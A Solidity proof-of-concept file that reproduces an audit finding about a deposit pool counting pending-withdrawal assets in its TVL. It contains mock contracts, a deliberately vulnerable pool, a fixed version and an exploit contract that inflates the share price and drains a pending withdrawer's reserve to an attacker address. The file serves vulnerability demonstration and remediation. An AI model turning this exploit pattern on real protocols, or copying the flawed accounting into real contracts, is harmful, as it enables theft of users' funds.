// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Elytra finding 63543 (C-03):
// "TVL errors by including pending withdrawal assets".
//
// ElytraDepositPoolV1.getTotalAssetTVL() returns
//     poolBalance + strategyAllocated + unstakingVaultBalance
// where unstakingVaultBalance is the assets still physically sitting in the
// unstaking vault to back PENDING withdrawal requests. But those requests
// already BURNED their elyAsset shares in requestWithdrawal(). So the burned
// shares leave the supply while their backing stays in the TVL, and
//     price = TVL / supply
// spikes artificially. A later withdrawer redeems their (unburned) shares at
// the inflated price and drains far more than their fair share — the excess is
// stolen from the assets reserved for the pending withdrawer.
//
// Numeric model from the report (Description → Exploitation Example):
//   Initial : 15e18 HYPE in pool, 10e18 elyHYPE supply, price = 1.5
//   User A  : requestWithdrawal(6e18 elyHYPE) → burns 6e18, moves 9e18 HYPE to
//             the unstaking vault. Supply → 4e18. Buggy TVL stays 15e18.
//             New price = 15e18 / 4e18 = 3.75  (inflated).
//   User B  : withdraw(4e18 elyHYPE) → 4e18 * 3.75 = 15e18 HYPE, draining both
//             the pool (6e18) AND the vault reserve (9e18) that backed A.
//   Fair    : B's 4e18 at the honest price 1.5 is worth ~6e18. Excess = 9e18,
//             which is exactly the backing stolen from pending withdrawer A.
//
// VERBATIM (the vuln target): getTotalAssetTVL + _getUnstakingVaultBalance are
// inlined byte-identical from the finding, `// @>` on the defective line. The
// requestWithdrawal burn and the price=TVL/supply redemption are reconstructed
// faithfully from the report's explicit numeric model (they are not embedded
// verbatim; the report only quotes the TVL functions).
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IElytraConfig {
    function getContract(bytes32 key) external view returns (address);
}

interface IElytraUnstakingVault {
    function getClaimableAssets(address asset) external view returns (uint256);
}

/// @dev Faithful minimal double for Elytra's constant registry key.
library ElytraConstants {
    bytes32 internal constant ELYTRA_UNSTAKING_VAULT = keccak256("ELYTRA_UNSTAKING_VAULT");
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful doubles for opaque boundaries (a plain ERC20 asset, a share
// token with mint/burn, the config registry, and the unstaking vault).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 asset double (the "HYPE" collateral). 18 decimals.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal elyAsset share token: mint/burn drive the supply that prices use.
contract MiniShareToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

/// @dev Faithful minimal double for the Elytra config/registry.
contract ElytraConfig {
    mapping(bytes32 => address) internal contracts;

    function setContract(bytes32 key, address addr) external {
        contracts[key] = addr;
    }

    function getContract(bytes32 key) external view returns (address) {
        return contracts[key];
    }
}

/// @dev Faithful minimal double for the unstaking vault. It physically holds the
///      assets reserved for pending withdrawals and reports them as "claimable".
///      getClaimableAssets returns its live asset balance — exactly the value the
///      pool double-counts into TVL after the backing shares were already burned.
contract ElytraUnstakingVault {
    mapping(address => uint256) public pendingOf; // account => assets it is owed

    function getClaimableAssets(address asset) external view returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    /// @notice Record that `account` is owed `amount` of `asset` after a request.
    function recordPending(address, /*asset*/ address account, uint256 amount) external {
        pendingOf[account] += amount;
    }

    /// @notice Move physical backing out of the vault (used when an inflated
    ///         redemption in the pool has to reach past pool liquidity into the
    ///         reserve — this is how the pending withdrawer's assets get stolen).
    function drainTo(address asset, address to, uint256 amount) external {
        MiniToken(asset).transfer(to, amount);
    }

    /// @notice Pending withdrawer completes: paid from whatever physical assets
    ///         remain. After the exploit drains the reserve this yields 0.
    function completeWithdrawal(address asset, address account) external returns (uint256 paid) {
        uint256 owed = pendingOf[account];
        uint256 have = IERC20(asset).balanceOf(address(this));
        paid = owed <= have ? owed : have;
        pendingOf[account] -= paid;
        if (paid > 0) MiniToken(asset).transfer(account, paid);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. getTotalAssetTVL + _getUnstakingVaultBalance are inlined
// VERBATIM from the finding. requestWithdrawal / withdraw / price are the
// faithful reconstruction of the report's numeric model.
// ─────────────────────────────────────────────────────────────────────────────
contract ElytraDepositPoolV1 {
    IElytraConfig public elytraConfig;
    MiniShareToken public elyToken;
    address public asset;
    mapping(address => uint256) public assetsAllocatedToStrategies;

    constructor(address config_, address elyToken_, address asset_) {
        elytraConfig = IElytraConfig(config_);
        elyToken = MiniShareToken(elyToken_);
        asset = asset_;
    }

    // ===== VERBATIM vulnerable source (from the finding) — do not edit =====
    function getTotalAssetTVL(address asset) public view returns (uint256 totalTVL) {
        uint256 poolBalance = IERC20(asset).balanceOf(address(this));
        uint256 strategyAllocated = assetsAllocatedToStrategies[asset];
        uint256 unstakingVaultBalance = _getUnstakingVaultBalance(asset);

        return poolBalance + strategyAllocated + unstakingVaultBalance; // @> counts unstaking-vault backing of already-burned pending shares → inflates TVL/price
    }

    function _getUnstakingVaultBalance(address asset) internal view returns (uint256 balance) {
        address unstakingVault = elytraConfig.getContract(ElytraConstants.ELYTRA_UNSTAKING_VAULT);
        if (unstakingVault == address(0)) {
            return 0;
        }

        try IElytraUnstakingVault(unstakingVault).getClaimableAssets(asset) returns (uint256 claimableAmount) {
            return claimableAmount;
        } catch {
            return 0;
        }
    }
    // ===== end verbatim =====

    function _vault() internal view returns (ElytraUnstakingVault) {
        return ElytraUnstakingVault(elytraConfig.getContract(ElytraConstants.ELYTRA_UNSTAKING_VAULT));
    }

    /// @notice elyAsset price = TVL / supply (1e18 scaled), per the report.
    function getElyAssetPrice() public view returns (uint256) {
        uint256 supply = elyToken.totalSupply();
        if (supply == 0) return 1e18;
        return getTotalAssetTVL(asset) * 1e18 / supply;
    }

    /// @notice Reconstructed requestWithdrawal: burns the shares IMMEDIATELY and
    ///         moves their backing to the unstaking vault (still counted in TVL).
    function requestWithdrawal(address account, uint256 shares) external {
        uint256 assets = shares * getElyAssetPrice() / 1e18; // priced BEFORE the burn
        elyToken.burn(account, shares);                      // shares leave supply now
        MiniToken(asset).transfer(address(_vault()), assets); // backing leaves the pool
        _vault().recordPending(asset, account, assets);       // vault owes `account`
    }

    /// @notice Reconstructed withdraw: redeem shares at the (now inflated) price.
    ///         If the owed amount exceeds pool liquidity it reaches into the
    ///         unstaking-vault reserve — draining the pending withdrawer's assets.
    function withdraw(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = shares * getElyAssetPrice() / 1e18;
        elyToken.burn(msg.sender, shares);
        uint256 poolBal = IERC20(asset).balanceOf(address(this));
        if (assetsOut > poolBal) {
            _vault().drainTo(asset, address(this), assetsOut - poolBal);
        }
        MiniToken(asset).transfer(msg.sender, assetsOut);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (Option A from the report): subtract pending-withdrawal backing
// from TVL. Here the unstaking vault holds only pending backing, so the fix is to
// exclude the vault balance from TVL. Everything else is identical.
// ─────────────────────────────────────────────────────────────────────────────
contract ElytraDepositPoolV1Fixed {
    IElytraConfig public elytraConfig;
    MiniShareToken public elyToken;
    address public asset;
    mapping(address => uint256) public assetsAllocatedToStrategies;

    constructor(address config_, address elyToken_, address asset_) {
        elytraConfig = IElytraConfig(config_);
        elyToken = MiniShareToken(elyToken_);
        asset = asset_;
    }

    // FIX: pending-withdrawal backing (the unstaking-vault balance) is excluded,
    // because those shares were already burned out of `supply`.
    function getTotalAssetTVL(address asset) public view returns (uint256 totalTVL) {
        uint256 poolBalance = IERC20(asset).balanceOf(address(this));
        uint256 strategyAllocated = assetsAllocatedToStrategies[asset];
        return poolBalance + strategyAllocated;
    }

    function _vault() internal view returns (ElytraUnstakingVault) {
        return ElytraUnstakingVault(elytraConfig.getContract(ElytraConstants.ELYTRA_UNSTAKING_VAULT));
    }

    function getElyAssetPrice() public view returns (uint256) {
        uint256 supply = elyToken.totalSupply();
        if (supply == 0) return 1e18;
        return getTotalAssetTVL(asset) * 1e18 / supply;
    }

    function requestWithdrawal(address account, uint256 shares) external {
        uint256 assets = shares * getElyAssetPrice() / 1e18;
        elyToken.burn(account, shares);
        MiniToken(asset).transfer(address(_vault()), assets);
        _vault().recordPending(asset, account, assets);
    }

    function withdraw(uint256 shares) external returns (uint256 assetsOut) {
        assetsOut = shares * getElyAssetPrice() / 1e18;
        elyToken.burn(msg.sender, shares);
        uint256 poolBal = IERC20(asset).balanceOf(address(this));
        if (assetsOut > poolBal) {
            _vault().drainTo(asset, address(this), assetsOut - poolBal);
        }
        MiniToken(asset).transfer(msg.sender, assetsOut);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. User A requests a withdrawal (burning shares while its backing
// stays counted), inflating the price; the attacker (user B) then redeems the
// remaining shares at the inflated price and walks away with the reserve that
// was owed to A. The stolen EXCESS over B's fair share is delivered to the
// attacker EOA as STOLEN-HYPE.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant USER_A = 0x000000000000000000000000000000000000aaaa;

    uint256 internal constant POOL_SEED = 15e18; // initial pool assets
    uint256 internal constant SUPPLY_A = 6e18;   // A's elyHYPE
    uint256 internal constant SUPPLY_B = 4e18;   // B's (attacker's) elyHYPE
    uint256 internal constant A_REQUEST = 6e18;  // A withdraws all its shares

    // Deployed pieces.
    MiniToken public hype;
    MiniShareToken public ely;
    ElytraConfig public config;
    ElytraUnstakingVault public vault;
    ElytraDepositPoolV1 public pool;

    // Exposed results (asserted by the driver).
    uint256 public priceBefore;      // 1.5e18
    uint256 public priceAfterBuggy;  // 3.75e18
    uint256 public buggyReceived;    // 15e18  (B's inflated redemption)
    uint256 public fairReceived;     // 6e18   (B's honest 1.5x redemption)
    uint256 public excessStolen;     // 9e18   (delivered to the attacker)
    uint256 public victimAClaim;     // 9e18   (A was owed this)
    uint256 public victimAPaid;      // 0      (reserve was drained)
    uint256 public attackerHype;     // 9e18   (STOLEN-HYPE at the attacker EOA)

    address public poolAddr;
    address public vulnAddr;
    address public profitTokenAddr;

    function run() external payable {
        // --- deploy every piece unconditionally, fixed order ---
        hype = new MiniToken("Hyperliquid HYPE", "STOLEN-HYPE");  // nonce 1
        ely = new MiniShareToken("Elytra HYPE", "elyHYPE");       // nonce 2
        config = new ElytraConfig();                              // nonce 3
        vault = new ElytraUnstakingVault();                       // nonce 4
        pool = new ElytraDepositPoolV1(address(config), address(ely), address(hype)); // nonce 5

        poolAddr = address(pool);
        vulnAddr = address(pool);
        profitTokenAddr = address(hype);

        config.setContract(ElytraConstants.ELYTRA_UNSTAKING_VAULT, address(vault));

        // --- seed the initial state: 15e18 HYPE, 10e18 elyHYPE supply ---
        hype.mint(address(pool), POOL_SEED);
        ely.mint(USER_A, SUPPLY_A);          // A's fair position
        ely.mint(address(this), SUPPLY_B);   // B (attacker) holds the rest

        priceBefore = pool.getElyAssetPrice(); // 15e18 / 10e18 = 1.5e18

        // B's HONEST redemption value at the pre-manipulation price.
        fairReceived = SUPPLY_B * priceBefore / 1e18; // 4e18 * 1.5 = 6e18

        // --- A requests withdrawal: shares burned now, backing parked in vault ---
        pool.requestWithdrawal(USER_A, A_REQUEST); // burns 6e18, moves 9e18 to vault
        victimAClaim = vault.pendingOf(USER_A);    // A is owed 9e18

        // TVL still counts the 9e18 vault backing even though A's shares are gone.
        priceAfterBuggy = pool.getElyAssetPrice(); // 15e18 / 4e18 = 3.75e18

        // --- attacker (B) redeems the remaining shares at the inflated price ---
        buggyReceived = pool.withdraw(SUPPLY_B);   // 4e18 * 3.75 = 15e18, drains vault reserve

        // --- the pending withdrawer A can no longer be paid: reserve is gone ---
        victimAPaid = vault.completeWithdrawal(address(hype), USER_A); // 0

        // --- deliver the stolen EXCESS (over B's fair share) to the attacker EOA ---
        excessStolen = buggyReceived - fairReceived; // 15e18 - 6e18 = 9e18
        hype.transfer(ATTACKER, excessStolen);
        attackerHype = hype.balanceOf(ATTACKER);

        require(buggyReceived > fairReceived, "no price manipulation");
        require(priceAfterBuggy > priceBefore, "price not inflated");
        require(victimAPaid < victimAClaim, "pending withdrawer not harmed");
        require(attackerHype == excessStolen, "attacker did not receive stolen assets");
    }
}
